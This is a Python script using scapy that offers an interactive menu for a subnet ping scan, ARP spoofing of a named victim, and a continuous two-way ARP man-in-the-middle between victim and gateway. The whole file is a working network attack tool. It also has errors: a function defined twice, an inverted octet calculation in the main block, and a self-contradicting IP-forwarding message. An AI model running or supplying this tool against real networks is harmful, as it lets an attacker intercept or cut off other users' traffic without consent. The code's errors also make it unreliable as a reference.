import time
import scapy.all as scapy
import os
import itertools

def spoof_arp(victim_ip, gateway_ip, victim_mac, gateway_mac):
    # Create an ARP response packet
    arp_response = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip)
    scapy.send(arp_response)


def MITM_arp(victim_ip, gateway_ip, victim_mac, gateway_mac):
    # Create an ARP response packet
    arp_response = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip)
    scapy.send(arp_response)
    arp_response = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip)
    scapy.send(arp_response)


def ping_scan(ip_range):
    # Perform a ping scan to find active hosts in the given IP range
    arp_request = scapy.ARP(pdst=ip_range)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    active_hosts = []
    for element in answered_list:
        active_hosts.append({'ip': element[1].psrc, 'mac': element[1].hwsrc})

    return active_hosts


def check_ping(hostname):
    response = os.system(f"ping -n 1 -w 200 {hostname} > nul")
    return response == 0


def create_ip_range(fixed_octets):
    if fixed_octets not in (1, 2, 3):
        raise ValueError(
            "fixed_octets must be 1, 2, or 3, representing /8, /16, or /24"
            " respectively."
        )

    variable_octets = 4 - fixed_octets

    if variable_octets == 1:
        for z in range(1, 255):
            yield (z,)
    else:
        middle_ranges = [range(0, 256)] * (variable_octets - 1)
        last_range = [range(1, 255)]
        yield from itertools.product(*middle_ranges, *last_range)


def ping_scan(base_ip, fixed_octets):
    if fixed_octets not in (1, 2, 3):
        raise ValueError(
            "fixed_octets must be 1, 2, or 3, representing /8, /16, or /24"
            " respectively."
        )

    base_ip_parts = base_ip.split(".")
    if len(base_ip_parts) != 4:
        raise ValueError("base_ip must be a valid IPv4 address.")
    prefix = ".".join(base_ip_parts[:fixed_octets])

    alive_hosts = []
    for ip_tuple in create_ip_range(fixed_octets):
        suffix = ".".join(str(x) for x in ip_tuple)
        ip_str = f"{prefix}.{suffix}"
        print(f"Pinging {ip_str}...")
        if check_ping(ip_str):
            alive_hosts.append(ip_str)

    return alive_hosts

def get_mac(ip):
    arp_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip)
    reply, something = scapy.srp(arp_request, timeout = 3, verbose=0)
    if reply:
        return reply[0][1].src
    return None

def ip_to_mac(ip):
    target_mac = None
    while not target_mac:
        target_mac = get_mac(ip)
        if not target_mac:
            print("MAC address for target not found \n")
    print("target mac address is:{}".format(target_mac))
    return target_mac

if __name__ == "__main__":
    gateway_ip = input("Enter the gateway IP address: ")        
    mood = input("choose an option (1 for ping scan, 2 for ARP spoofing, 3 for ARP MITM): ").lower()
    if  "1" in mood:
        try:
            print(ping_scan(gateway_ip, 4 - int(input("Enter the number of fixed octets (1 for /8, 2 for /16, 3 for /24): "))))
        except ValueError as e:
            print(f"Error: {e}")
    else:
        gateway_mac = ip_to_mac(gateway_ip)  
        victim_ip = input("Enter the victim IP address: ")  
        victim_mac = ip_to_mac(victim_ip)  
        if "2" in mood:
            print(f"Starting ARP spoofing attack on {victim_ip}...")
            print("make sure to disable IP forwarding on your machine to allow traffic to pass through.")
            try:
                while True:
                    spoof_arp(victim_ip, gateway_ip, victim_mac, gateway_mac)
            except KeyboardInterrupt:
                print("\nARP spoofing attack stopped.")
        
        else:
            print(f"Starting ARP MITM attack on {victim_ip}...")
            print("make sure to enable IP forwarding on your machine to allow traffic to pass through.")
            try:
                while True:
                    MITM_arp(victim_ip, gateway_ip, victim_mac, gateway_mac)
                    time.sleep(2)
            except KeyboardInterrupt:
                print("\nARP spoofing attack stopped.")
